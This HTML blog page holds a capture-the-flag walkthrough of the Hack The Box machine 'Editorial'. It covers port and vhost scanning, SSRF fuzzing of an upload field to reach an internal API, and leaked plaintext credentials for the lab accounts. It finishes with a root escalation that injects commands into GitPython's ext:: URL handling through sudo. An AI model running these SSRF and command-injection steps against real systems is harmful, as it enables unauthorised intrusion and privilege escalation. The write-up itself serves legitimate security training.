@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Editorial - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Editorial</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1723723575954"
+                  >2024-08-15 14:06</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1723805497660"
+                  >2024-08-16 12:51</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A editorial.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 12:09 UTC
+Nmap scan report <span class="hljs-keyword">for</span> editorial.htb (10.129.181.2)
+Host is up (0.031s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Editorial Tiempo Arriba
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.70 seconds</code></pre></div>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$gobuster</span> vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://editorial.htb  --append-domain -t 150
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://editorial.htb
+[+] Method:          GET
+[+] Threads:         150
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   <span class="hljs-literal">true</span>
+===============================================================
+Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode
+===============================================================
+Progress: 3000000 / 3000001 (100.00%)
+===============================================================
+Finished
+===============================================================</code></pre></div>
+<p><img src="/_resources/94fbe7835fb44100972f6d48f35ddec1.png" /></p>
+<p>Our prime suspect for now looks like this:</p>
+<p><img src="/_resources/28609709bde4477bac457afd7bad82ee.png" /></p>
+<p>We can get two responses depending on our uploads:<br />
+/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg<br />
+/static/uploads/6fb354f6-6c83-424b-b513-f2bce21f6aec</p>
+<p><img src="/_resources/473a80487fc041a7adb63d2d57408aa8.png" /></p>
+<p><img src="/_resources/aa01e959a84748459882a7f8cdc09e0c.png" /></p>
+<p>Going to <a title="http://editorial.htb/static/uploads/cd349514-acea-43e9-8463-b46c3ef54440" href="http://editorial.htb/static/uploads/cd349514-acea-43e9-8463-b46c3ef54440">http://editorial.htb/static/uploads/cd349514-acea-43e9-8463-b46c3ef54440</a> lets us download the image, but it seems to get deleted after a short amount of time.</p>
+<p>Replacing the url, also returns us standard error image.</p>
+<p><img src="/_resources/10309115ca704185a0aedcebf0b5411f.png" /></p>
+<p>We can check if there is anything on other ports.</p>
+<div><pre class="hljs"><code>seq 1 65535 &gt; numbered_file.txt</code></pre></div>
+<p>Then we create a req.txt file with which we will be fuzzing.</p>
+<div><pre class="hljs"><code>POST /upload-cover HTTP/<span class="hljs-number">1.1</span>
+Host: editorial.htb
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">128.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">128.0</span>
+Accept: *<span class="hljs-comment">/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://editorial.htb/upload
+Content-Type: multipart/form-data; boundary=---------------------------7876978943491642553877244290
+Content-Length: 357
+Origin: http://editorial.htb
+DNT: 1
+Connection: close
+Sec-GPC: 1
+Priority: u=0
+
+-----------------------------7876978943491642553877244290
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:FUZZ
+-----------------------------7876978943491642553877244290
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------7876978943491642553877244290--</span></code></pre></div>
+<p>and we can run ffuf, filtering responses with length 61, as it is the default 404.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$ffuf</span> -u http://editorial.htb/upload-cover -X POST -request req.txt -w numbered_file.txt -fs 61 
+
+        /<span class="hljs-string">'___\  /'</span>___\           /<span class="hljs-string">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://editorial.htb/upload-cover
+ :: Wordlist         : FUZZ: /home/user/Desktop/numbered_file.txt
+ :: Header           : Accept: */*
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Referer: http://editorial.htb/upload
+ :: Header           : Content-Type: multipart/form-data; boundary=---------------------------7876978943491642553877244290
+ :: Header           : Origin: http://editorial.htb
+ :: Header           : DNT: 1
+ :: Header           : Host: editorial.htb
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+ :: Header           : Priority: u=0
+ :: Header           : Connection: close
+ :: Header           : Sec-GPC: 1
+ :: Data             : -----------------------------7876978943491642553877244290
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:FUZZ
+-----------------------------7876978943491642553877244290
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------7876978943491642553877244290--
+
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 61
+________________________________________________
+
+5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 88ms]
+</span></code></pre></div>
+<p><img src="/_resources/41d993f2a1db4591a06ed11f8b54d275.png" /></p>
+<p>Going to the response, we can get finally some interesting content.</p>
+<p><img src="/_resources/0e7e69c9a33e43829f325cbc08ae8482.png" /></p>
+<p>Finally requesting <a title="http://127.0.0.1:5000/api/latest/metadata/messages/authors" href="http://127.0.0.1:5000/api/latest/metadata/messages/authors">http://127.0.0.1:5000/api/latest/metadata/messages/authors</a>, returns us:</p>
+<p><img src="/_resources/4742a30e5a104de3b19db9624ea484cc.png" /></p>
+<p>username: dev<br />
+password: dev080217_devAPI!@</p>
+<p>Which gets us nice ssh and a user flag.</p>
+<p>In home folder we have only one folder, apps. In it, there is only hidden .git folder.<br />
+<a title="https://git-scm.com/docs/gitrepository-layout" href="https://git-scm.com/docs/gitrepository-layout">https://git-scm.com/docs/gitrepository-layout</a></p>
+<div><pre class="hljs"><code>git <span class="hljs-built_in">log</span>
+git show &lt;id&gt;</code></pre></div>
+<p>In one of the git commits we can find</p>
+<div><pre class="hljs"><code>+# -- : (development) mail message to new authors
++@app.route(api_route + <span class="hljs-string">'/authors/message'</span>, methods=[<span class="hljs-string">'GET'</span>])
++def api_mail_new_authors():
++    return jsonify({
++        <span class="hljs-string">'template_mail_message'</span>: <span class="hljs-comment">"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, "</span> + api_editorial_name + <span class="hljs-comment">" Team."</span>
++    }) # <span class="hljs-type">TODO</span>: replace dev credentials when checks pass</code></pre></div>
+<p>username: prod<br />
+password: 080217_Producti0n_2023!@</p>
+<p>Running linPEAS again, shows us that we are now allowed to run a new script with sudo. Its also marked as 95% PE.</p>
+<div><pre class="hljs"><code> (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</code></pre></div>
+<p>Its a simple python scirpt for cloning repos.</p>
+<div><pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">from</span> git <span class="hljs-keyword">import</span> Repo
+
+os.chdir(<span class="hljs-string">'/opt/internal_apps/clone_changes'</span>)
+
+url_to_clone = sys.argv[<span class="hljs-number">1</span>]
+
+r = Repo.init(<span class="hljs-string">''</span>, bare=<span class="hljs-literal">True</span>)
+r.clone_from(url_to_clone, <span class="hljs-string">'new_changes'</span>, multi_options=[<span class="hljs-string">"-c protocol.ext.allow=always"</span>])</code></pre></div>
+<p>I’ve search on the internet to first find pwnkit exploit, which didnt work.<br />
+Then I’ve checked python libraries versions.</p>
+<div><pre class="hljs"><code>prod@editorial:/opt/internal_apps/clone_changes$ pip3 list
+Package               Version
+--------------------- ----------------
+...
+GitPython             3.1.29
+...</code></pre></div>
+<p>Checking GitPython version gets us this link.<br />
+<a title="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858" href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858</a></p>
+<div><pre class="hljs"><code>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="hljs-string">'ext::sh -c cp% /root/root.txt% /tmp/flag.txt'</span>
+
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="hljs-string">'ext::sh -c chmod% 777% /tmp/flag.txt'</span>
+
+cat /tmp/flag.txt</code></pre></div>
+<p>We are done.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
